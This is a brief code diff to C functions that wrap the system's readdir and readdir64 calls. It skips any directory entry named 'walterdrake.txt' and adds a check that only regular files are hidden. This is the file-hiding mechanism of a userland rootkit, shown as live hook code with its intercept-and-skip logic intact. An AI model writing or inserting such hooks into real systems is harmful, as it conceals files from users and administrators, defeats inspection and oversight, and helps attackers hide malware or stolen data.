@@ -26,7 +26,7 @@ struct dirent *readdir(DIR *dirp)
     struct dirent *d;
     while ((d = origReaddir(dirp)) != NULL)
     {
-        if(strcmp(d->d_name, "walterdrake.txt") == 0)
+        if(strcmp(d->d_name, "walterdrake.txt") == 0 && d->d_type == DT_REG)
             continue;
         return d;
     }
@@ -46,7 +46,7 @@ struct dirent64 *readdir64(DIR *dirp)
     struct dirent64 *d;
     while ((d = origReaddir64(dirp)) != NULL)
     {
-        if(strcmp(d->d_name, "dat.txt") == 0)
+        if(strcmp(d->d_name, "walterdrake.txt") == 0 && d->d_type == DT_REG)
             continue;
         return d;
     }
